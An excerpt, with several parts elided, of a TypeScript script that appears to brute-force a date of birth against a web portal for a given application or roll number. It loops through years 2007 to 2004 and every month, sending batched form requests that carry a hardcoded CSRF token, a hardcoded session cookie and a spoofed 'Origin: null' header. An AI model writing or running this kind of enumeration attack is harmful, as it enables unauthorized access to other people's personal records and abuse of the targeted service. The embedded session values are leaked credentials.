...
async function solve(appNo: string, day: string, month: string, year: string) {
  let data = qs.stringify({
    "_csrf-frontend":
      "ImBIZnWx1LYhIryJgb_NX1AH3mUczRk37tJK_KnySnsbLzwEMvLsj2lujtDX5p5pEUTqVVv5QXG6szyM3scyDw==",
  ...
  let config = {
    ...
    headers: {
      ...
      Cookie:
        "advanced-frontend=gv3sdffjldq99ot1l18v0hck0p; _csrf-frontend=3012f8c11c2b63622c4b78f2d669a2c3c59698f024a92fc6d05b26df52e562a6a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%229OtbGC89HL2YVYS6AC40G4XFTavpw5xt%22%3B%7D",
      Origin: "null",
...
async function main(rollNumber: string) {
  ...
  for (let year = 2007; year >= 2004; year--) {
    ...
    for (let month = 1; month <= 12; month++) {
      ...
      const dataPromises = [];
      console.log(
        `Sending requests for the month ${month} of the year ${year}`
      );
